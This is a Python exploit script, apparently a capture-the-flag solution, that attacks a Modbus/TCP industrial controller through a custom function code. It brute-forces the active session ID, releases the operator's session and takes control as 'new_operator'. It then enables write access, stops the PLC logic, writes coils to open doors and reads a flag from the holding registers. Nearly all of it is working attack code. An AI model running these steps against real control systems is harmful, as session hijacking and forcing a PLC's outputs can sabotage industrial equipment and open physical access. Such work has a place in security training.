#! /usr/bin/env python3
from pymodbus.client import ModbusTcpClient
from pymodbus.pdu import ModbusRequest, ModbusResponse
import struct
import logging
from pymodbus.transaction import ModbusSocketFramer
import time

# Configure logging
logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

# --- Challenge Constants ---
HOST_IP = '94.237.55.43'
HOST_PORT = 43634
CUSTOM_FUNCTION_CODE = 0x66
FLAG_ADDR_HOLDING_REGISTER = 123
FLAG_COUNT = 100
COIL_START = 0
COIL_VALUES = [0, 1, 1]
COIL_COUNT = len(COIL_VALUES)
PROBE_COMMAND = 0x45 
INVALID_SESSION_ERROR = [0xe0, 0x08]

# --- Custom Protocol Classes ---
class CustomProtocolRequest(ModbusRequest):
    function_code = CUSTOM_FUNCTION_CODE

    def __init__(self, session=0x00, code=0, data=None, **kwargs):
        super().__init__(**kwargs)
        self.session = session
        self.code = code
        self.data = data if data is not None else []

    def encode(self):
        data_format = '>BB' + 'B' * len(self.data)
        return struct.pack(data_format, self.session, self.code, *self.data)

class CustomProtocolResponse(ModbusResponse):
    function_code = CUSTOM_FUNCTION_CODE

    def __init__(self, session=0x00, code=0x00, response_code=0x00, data=None, **kwargs):
        super().__init__(**kwargs)
        self.session = session
        self.code = code
        self.data = data if data is not None else []

    def decode(self, data):
        self.session, self.code, self.response_status = struct.unpack('>BBB', data[:3])
        self.data = list(struct.unpack('>' + 'B' * (len(data) - 3), data[3:]))

# --- Helper Function for Sending Packets ---
def send_packet(client, session_id, custom_code, data_payload=[]):
    if not client.is_socket_open():
        client.connect()
    
    request = CustomProtocolRequest(session=session_id, code=custom_code, data=data_payload)
    response = client.execute(request)
    
    if response.isError():
        log.error(f"Modbus-level error for request with session {session_id}, code {custom_code}")
        return None, None, None
    
    return response.code, response.response_status, response.data

# --- Main Exploit Logic ---
if __name__ == "__main__":
    
    client = ModbusTcpClient(HOST_IP, port=HOST_PORT, framer=ModbusSocketFramer)
    client.framer.decoder.register(CustomProtocolResponse)
    
    active_session_id = -1

    # --- Step 1: Find the active session ID by brute-forcing ---
    log.info("[+] Starting brute-force to find the active session ID...")
    for i in range(0x00, 0xff + 1):
        code, status, data = send_packet(client, i, PROBE_COMMAND)
        if data is not None and data != INVALID_SESSION_ERROR:
            active_session_id = i
            log.info(f"[+] Active Session ID found: {active_session_id} ({active_session_id:#x})")
            break
            
    if active_session_id == -1:
        log.error("[-] Could not find an active session. Exiting.")
        exit()

    # --- Step 2: Release the active session ---
    log.info(f"[+] Releasing the active session ({active_session_id})...")
    send_packet(client, active_session_id, 0x11)
    
    # --- Step 3: Create a new session to gain exclusive control ---
    log.info("[+] Taking a new session with username 'new_operator'...")
    username = [ord(char) for char in 'new_operator']
    payload = [len(username)] + username
    
    code, status, data = send_packet(client, active_session_id, 0x10, payload)
    
    new_session_id = data[0]
    log.info(f"[+] New session acquired: {new_session_id}")

    # --- Step 4: Enable Write Access and Stop PLC ---
    log.info("[+] Enabling write access and stopping PLC logic...")
    send_packet(client, new_session_id, 0x46)
    send_packet(client, new_session_id, 0x52)
    time.sleep(1)

    # --- Step 5: Open Doors and Get Flag ---
    log.info("[+] Writing to coils to open doors...")
    response = client.write_coils(COIL_START, COIL_VALUES)
    if response.isError():
        log.error("[-] Error writing to coils.")
    else:
        log.info("[+] Coils written successfully.")

    # [cite_start]Wait for doors to open, as per Notes.jpg [cite: 3]
    log.info("[+] Waiting 11 seconds for doors to open...")
    time.sleep(11)
    
    # Reading coils to confirm they are still set
    read_response = client.read_coils(COIL_START, COIL_COUNT)
    if not read_response.isError():
        log.info(f"[+] Verifying coil values: {read_response.bits}")
    
    # Read the flag from the specified holding register
    log.info(f"[+] Reading flag from Holding Register {FLAG_ADDR_HOLDING_REGISTER}...")
    read_response = client.read_holding_registers(FLAG_ADDR_HOLDING_REGISTER, FLAG_COUNT)
    
    if not read_response.isError():
        flag = ''.join([chr(char) for char in read_response.registers if char != 0])
        log.info(f"\n[SUCCESS] FLAG: {flag}")
    else:
        log.error(f"[-] Error reading registers: {read_response}")

    client.close()
    log.info("\n[+] Connection closed.")